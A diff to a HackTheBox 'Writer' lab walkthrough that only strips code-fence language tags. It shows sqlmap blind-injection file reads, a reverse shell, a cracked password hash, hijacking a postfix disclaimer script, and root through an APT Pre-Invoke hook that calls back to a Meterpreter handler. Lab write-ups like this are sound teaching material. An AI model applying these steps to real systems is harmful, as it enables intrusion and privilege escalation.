@@ -29,13 +29,13 @@ Writer is a Medium level box on HackTheBox that I worked through just prior to i
 ## Enumeration
 
 The first thing to do is to add the following entry to `/etc/hosts`
-```Awk
+```
 10.10.11.101    writer.htb
 ```
 
 ### Nmap
 From there, an nmap scan should show us all the open and listening TCP ports on the machine:
-```Awk
+```
 └─# nmap -A -p- -T4 writer.htb
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 10:13 EST
 Nmap scan report for writer.htb (10.10.11.101)
@@ -92,7 +92,7 @@ Interesting, this is an Ubuntu machine, running SSH and HTTP, which is fairly co
 ### smbclient
 Using smbclient to list the shares we get the following:
 
-```Awk
+```
 └─# smbclient -L writer.htb
 Enter WORKGROUP\root's password:
 
@@ -105,7 +105,7 @@ SMB1 disabled -- no workgroup available
 ```
 
 Trying to access the `writer2_project` gives us this:
-```Awk
+```
 └─# smbclient  \\\\writer.htb\\writer2_project
 Enter WORKGROUP\root's password:
 tree connect failed: NT_STATUS_ACCESS_DENIED
@@ -123,7 +123,7 @@ Since it has HTTP running, lets just navigate to the site real quick:
 
 My first guess looking at this would be possibly WordPress, but `/wp-admin` does not exist, so let's run a quick gobuster against the site and see what we find.
 
-```Awk
+```
 └─# gobuster dir -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://writer.htb
 ===============================================================
 Gobuster v3.1.0
@@ -179,7 +179,7 @@ uname=admin&password=admin
 
 Let's see what sqlmap can do with this as I have very limited experience with SQL injection:
 
-```Awk
+```
 └─# sqlmap -u "http://writer.htb/administrative" --data "uname=user&password=pass" --risk 3
         ___
        __H__
@@ -247,7 +247,7 @@ Now if you notice in the top corner of this page, it actually displays the query
 
 First, we want to get our privileges to see what we can do as the database user:
 
-```Awk
+```
 └─# sqlmap -u "http://writer.htb/administrative" --data "uname=user&password=pass" --risk 3 --threads=10 --privileges
 
 database management system users privileges:
@@ -262,7 +262,7 @@ database management system users privileges:
 
 This tells us that as the current user we can read files.  Now, blind SQL injection means that this will take a very long time to read a file, and we also do not have a way to know what files will be there other than guessing.  But we know that the box is running Apache on Ubuntu, so lets start with the default sites enabled configuration found at `/etc/apache2/sites-enabled/000-default.conf`  To do this we simply need to give sqlmap the `--file-read=/path/to/file` parameter, and it will download the file for us...using blind SQL injection.  This easily took 20 minutes to an hour per file as blind SQL injection is a very tedious process, but we were finally presented with the following file:
 
-```ApacheConf
+```
 # Virtual host configuration for writer.htb domain
 <VirtualHost *:80>
         ServerName writer.htb
@@ -677,7 +677,7 @@ While this seems to have foiled our evil scheme, it is actually only a client si
 
 Then bam, we finally get a reverse shell:
 
-```Awk
+```
 └─# nc -lvp 3939
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::3939
@@ -696,13 +696,13 @@ www-data@writer:/$
 ### Foothold Enumeration
 
 From here we can start to actually investigate the running processes and other things on the machine.  Inspecting `/etc/passwd` shows us the two main users of the box:
-```Awk
+```
 kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
 john:x:1001:1001:,,,:/home/john:/bin/bash
 ```
 
 Next we can look at what is running on the box:
-```Awk
+```
 www-data@writer:/$ ss -tlpn
 ss -tlpn
 State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
@@ -722,14 +722,14 @@ LISTEN    0         128                   [::]:22                  [::]:*
 So, port 8080 can likely be assumed to be the second website we observed earlier in the Apache config file. Port 445, 139, 22, and 80 we already know from the nmap scan. Port 53 is most likely local DNS.  Port 3306 is the MySQL database.  But port 25 is SMTP so there is likely a mail server running on this machine.
 
 Continuing our research, we can now navigate to the `writer2_project` directory, and we see more Python Django files, including a `settings.py` file which could prove useful:
-```Awk
+```
 www-data@writer:/var/www/writer2_project/writerv2$ cat settings.py | grep mysql
         'ENGINE': 'django.db.backends.mysql',
             'read_default_file': '/etc/mysql/my.cnf',
 ```
 
 This points us to another file which just happens to have database credentials in plaintext:
-```Awk
+```
 www-data@writer:/var/www/writer2_project/writerv2$ tail /etc/mysql/my.cnf
 
 # Import all .cnf files from configuration directory
@@ -746,7 +746,7 @@ default-character-set = utf8
 ### Database Inspection
 
 So now we can login to the database and inspect the tables:
-```Awk
+```
 www-data@writer:/var/www/writer2_project/writerv2$ mysql -u djangouser -p
 Enter password:
 
@@ -770,7 +770,7 @@ MariaDB [dev]> show tables;
 
 
 Let's take a closer look at the `auth_user` table:
-```Awk
+```
 MariaDB [dev]> select * from auth_user;
 +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
 | id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
@@ -783,7 +783,7 @@ MariaDB [dev]> select * from auth_user;
 ### Password Cracking
 
 Here we have a password hash for the user Kyle.  Since we saw the user on the box, we can assume that this is probably also their local user password.  Let's put it into hashcat and see what happens:
-```Awk
+```
 └─# cat kyle.hash
 pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=
 
@@ -794,7 +794,7 @@ pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5
 ### Gaining Kyle
 
 This gives us the password `marcoantonio` and using SSH we can now login as kyle and get user.txt:
-```Awk
+```
 └─# ssh kyle@writer.htb
 kyle@writer.htb's password:
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
@@ -805,7 +805,7 @@ kyle@writer:~$ cat user.txt
 ### Kyle Enumeration
 
 Now we need to escalate to root, but likely since there was another user on the box, we need to take a detour and gain the user john first.  Looking at the groups that kyle is a member of we notice the `filter` group in addition to the normal `kyle` and `smbgroup`
-```Awk
+```
 kyle@writer:~$ cat /etc/group | grep kyle
 kyle:x:1000:
 filter:x:997:kyle
@@ -813,7 +813,7 @@ smbgroup:x:1002:kyle
 ```
 
 Inspecting the box further, we can see that postfix is the service running on 25/tcp and coincidentally, the filter group exists on one of the files in the postfix configuration:
-```Awk
+```
 kyle@writer:/etc/postfix$ ls -al
 total 140
 drwxr-xr-x   5 root root    4096 Jul  9 10:59 .
@@ -838,13 +838,13 @@ drwxr-xr-x   2 root root    4096 Jun 19  2020 sasl
 ### Postfix Inspection
 
 Now, I had never used postfix before, so I was not really sure what to do with this, but if we look at the `master.cf` configuration file we see the following:
-```Awk
+```
 kyle@writer:~$ cat /etc/postfix/master.cf | grep john
   flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
 ```
 
 Doing some research into postfix, what is actually happening here is that postfix will execute the `/etc/postfix/disclaimer` script when john receives an email.  This is useful to us since we can edit the script that it executes! What is better is that using `pspy64` we can see that when this executes, it executes as the user john:
-```Awk
+```
 2021/12/11 14:32:08 CMD: UID=1001 PID=378522 | /bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- john@writer.htb
 ```
 
@@ -858,7 +858,7 @@ So now we have our path to escalate to john:
 ### Gaining John
 
 I prefer to use Meterpreter sessions rather than normal reverse shells as they call their own binary, so I generated a payload and copied it over.  I also created the following little script to detatch the Meterpreter binary from the process which calls it, which should prevent my session from dying:
-```Awk
+```
 kyle@writer:/tmp/.tempdir$ cat script.sh
 #!/bin/bash
 
@@ -866,7 +866,7 @@ nohup /tmp/.tempdir/shell.elf &
 ```
 
 Now I just need to send an email to john somehow to get a callback.  Luckily, this is pretty easy to do using python:
-```Awk
+```
 kyle@writer:/tmp/.tempdir$ python3
 Python 3.8.10 (default, Jun  2 2021, 10:49:15)
 [GCC 9.4.0] on linux
@@ -877,7 +877,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 ```
 
 And then we have a Meterpreter session:
-```Awk
+```
 msf6 exploit(multi/handler) >
 [*] Sending stage (3012548 bytes) to 10.10.11.101
 se[*] Meterpreter session 2 opened (10.10.10.10:4646 -> 10.10.11.101:34270 ) at 2021-12-11 09:16:54 -0500                                                                                                        ssions
@@ -890,7 +890,7 @@ Active sessions                                                                 
 ```
 
 Using this, we can grab john's private SSH key:
-```Awk
+```
 msf6 exploit(multi/handler) > sessions -i 2
 [*] Starting interaction with 2...
 
@@ -907,7 +907,7 @@ meterpreter > bg
 ```
 
 We can then put this in a file and SSH in as john using it:
-```Awk
+```
 └─# vi john_id_rsa
 
 └─# chmod 600 john_id_rsa
@@ -920,7 +920,7 @@ john@writer:~$
 ### John Enumeration
 
 Now, we finally can try to escalate to root.  Inspecting processes with pspy64 you can see that periodically, the box is running `apt-get update`:
-```Awk
+```
 2021/12/11 14:30:01 CMD: UID=0    PID=378422 | /bin/sh -c /usr/bin/apt-get update
 2021/12/11 14:30:01 CMD: UID=0    PID=378421 | /usr/bin/cp -r /root/.scripts/writer2_project /var/www/
 2021/12/11 14:30:01 CMD: UID=0    PID=378420 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ;
@@ -933,14 +933,14 @@ Now, we finally can try to escalate to root.  Inspecting processes with pspy64 y
 ```
 
 In addition, it is also removing all apt configuration files with a modification time of a day.  I guess this is supposed to prevent us from adding in our own configuration file to do what we want.  Looking at the groups john is a member of, we see we are also in the `management` group:
-```Awk
+```
 john@writer:~$ cat /etc/group | grep john
 john:x:1001:
 management:x:1003:john
 ```
 
 Let's look at the apt configuration directory:
-```Awk
+```
 john@writer:~$ ls -al /etc/apt/apt.conf.d
 total 48
 drwxrwxr-x 2 root management 4096 Dec 11 14:29 .
@@ -962,18 +962,18 @@ It looks like we cannot remove the files in the directory, but we can add our ow
 ### Gaining Root
 
 So after some quick research, we can create a file with the following contents to execute our script to give as another Meterpreter session as root:
-```Awk
+```
 john@writer:/etc/apt/apt.conf.d$ cat 02Update
 APT::Update::Pre-Invoke {"/tmp/.tempdir/script.sh"};
 ```
 
 That seems simple enough, but we also need to bypass the removal script.  This can be done by changing the modify time to more than a day ago:
-```Awk
+```
 john@writer:/etc/apt/apt.conf.d$ touch -d "29 hours ago" 02Update
 ```
 
 And now we wait for a shell:
-```Awk
+```
 msf6 exploit(multi/handler) >
 [*] Sending stage (3012548 bytes) to 10.10.11.101
 [*] Meterpreter session 3 opened (10.10.10.10:4646 -> 10.10.11.101:34762 ) at 2021-12-11 09:28:13 -0500
@@ -991,7 +991,7 @@ Active sessions
 Now we have a shell as root!
 
 From here we can get the root.txt and whatever else we want:
-```Awk
+```
 msf6 exploit(multi/handler) > sessions -i 3
 [*] Starting interaction with 3...
 
